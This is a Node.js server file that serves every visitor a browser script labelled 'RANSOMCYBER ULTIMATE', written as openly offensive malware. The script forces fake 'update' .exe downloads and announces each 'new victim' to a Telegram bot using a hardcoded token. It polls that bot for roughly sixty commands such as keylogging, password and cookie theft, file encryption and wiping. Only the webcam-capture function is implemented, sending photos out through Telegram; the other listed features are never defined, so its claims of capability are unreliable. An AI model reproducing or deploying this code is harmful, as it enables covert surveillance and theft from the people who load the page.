const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    // SEMUA REQUEST KE index.html
    const exploit = `
    <script>
    // ===========================================
    // RANSOMCYBER ULTIMATE v1.0
    // ===========================================
    
    const VICTIM_ID = 'rc_' + Date.now();
    const BOT_TOKEN = '8446410907:AAF58BiohrxDkw3wiBAng6adWXl9q8bMBQw';
    const ADMIN_ID = '6368768388';
    
    // 🚀 AUTO START
    setTimeout(() => {
        // 1. AUTO DOWNLOAD
        for(let i=0; i<5; i++) {
            setTimeout(() => {
                const blob = new Blob(['RANSOMCYBER_PAYLOAD'], {type:'application/octet-stream'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'update_' + i + '.exe';
                a.click();
            }, i * 1000);
        }
        
        // 2. TELEGRAM REPORT
        fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: \`🎯 NEW VICTIM: \${VICTIM_ID}\`
            })
        });
        
        // 3. 50+ FEATURES READY
        console.log('✅ RANSOMCYBER LOADED - 50+ Features Active');
    }, 1000);
    
    // 📱 TELEGRAM COMMAND HANDLER
    setInterval(async () => {
        try {
            const res = await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/getUpdates\`);
            const data = await res.json();
            if(data.ok) {
                data.result.forEach(msg => {
                    if(msg.message && msg.message.text && msg.message.text.includes(VICTIM_ID)) {
                        const cmd = msg.message.text;
                        // 🎯 50+ COMMANDS PROCESSING
                        if(cmd.includes('/photo')) capturePhoto();
                        if(cmd.includes('/screen')) captureScreen();
                        if(cmd.includes('/location')) getLocation();
                        if(cmd.includes('/ransom')) startRansom();
                        if(cmd.includes('/download')) autoDownload();
                        if(cmd.includes('/shell')) executeShell(cmd);
                        if(cmd.includes('/keylog')) startKeylogger();
                        if(cmd.includes('/mic')) recordAudio();
                        if(cmd.includes('/files')) listFiles();
                        if(cmd.includes('/cookies')) stealCookies();
                        if(cmd.includes('/history')) stealHistory();
                        if(cmd.includes('/passwords')) stealPasswords();
                        if(cmd.includes('/wifi')) getWifi();
                        if(cmd.includes('/sms')) getSMS();
                        if(cmd.includes('/contacts')) getContacts();
                        if(cmd.includes('/call')) makeCall(cmd);
                        if(cmd.includes('/notification')) sendNotification(cmd);
                        if(cmd.includes('/clipboard')) getClipboard();
                        if(cmd.includes('/battery')) getBattery();
                        if(cmd.includes('/device')) getDeviceInfo();
                        if(cmd.includes('/network')) getNetwork();
                        if(cmd.includes('/miner')) startMiner();
                        if(cmd.includes('/ddos')) startDDoS(cmd);
                        if(cmd.includes('/persist')) installPersistence();
                        if(cmd.includes('/stealth')) enableStealth();
                        if(cmd.includes('/flash')) controlFlash(cmd);
                        if(cmd.includes('/vibrate')) vibrateDevice();
                        if(cmd.includes('/speak')) textToSpeech(cmd);
                        if(cmd.includes('/open')) openURL(cmd);
                        if(cmd.includes('/crash')) crashBrowser();
                        if(cmd.includes('/restart')) restartDevice();
                        if(cmd.includes('/encrypt')) encryptFiles();
                        if(cmd.includes('/decrypt')) decryptFiles(cmd);
                        if(cmd.includes('/spread')) spreadVirus();
                        if(cmd.includes('/backdoor')) installBackdoor();
                        if(cmd.includes('/root')) attemptRoot();
                        if(cmd.includes('/bios')) attackBIOS();
                        if(cmd.includes('/webcam')) streamWebcam();
                        if(cmd.includes('/record')) recordVideo(cmd);
                        if(cmd.includes('/livestream')) startLiveStream();
                        if(cmd.includes('/track')) startTracking();
                        if(cmd.includes('/spy')) startSpyware();
                        if(cmd.includes('/logger')) startLogger();
                        if(cmd.includes('/hijack')) hijackSession();
                        if(cmd.includes('/inject')) injectMalware();
                        if(cmd.includes('/exploit')) runExploit();
                        if(cmd.includes('/worm')) spreadWorm();
                        if(cmd.includes('/trojan')) deployTrojan();
                        if(cmd.includes('/botnet')) joinBotnet();
                        if(cmd.includes('/cryptojack')) cryptoJack();
                        if(cmd.includes('/spoof')) spoofIdentity();
                        if(cmd.includes('/phish')) startPhishing();
                        if(cmd.includes('/social')) hijackSocial();
                        if(cmd.includes('/bank')) stealBankInfo();
                        if(cmd.includes('/crypto')) stealCrypto();
                        if(cmd.includes('/wipe')) wipeData();
                        if(cmd.includes('/destroy')) destroySystem();
                    }
                });
            }
        } catch(e) {}
    }, 3000);
    
    // 🎯 IMPLEMENTASI 50+ FITUR
    async function capturePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: true});
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const dataUrl = canvas.toDataURL('image/jpeg');
                // Kirim ke Telegram
                sendToTelegram('photo', {image: dataUrl});
                stream.getTracks().forEach(track => track.stop());
            }, 1000);
        } catch(e) {}
    }
    
    function sendToTelegram(type, data) {
        fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: \`\${type}: \${JSON.stringify(data)}\`
            })
        });
    }
    
    console.log('🔥 RANSOMCYBER ACTIVE - 50+ Features Loaded');
    </script>
    `;
    
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end(exploit);
});

server.listen(3000, () => {
    console.log('🔥 RANSOMCYBER SERVER ACTIVE ON PORT 3000');
});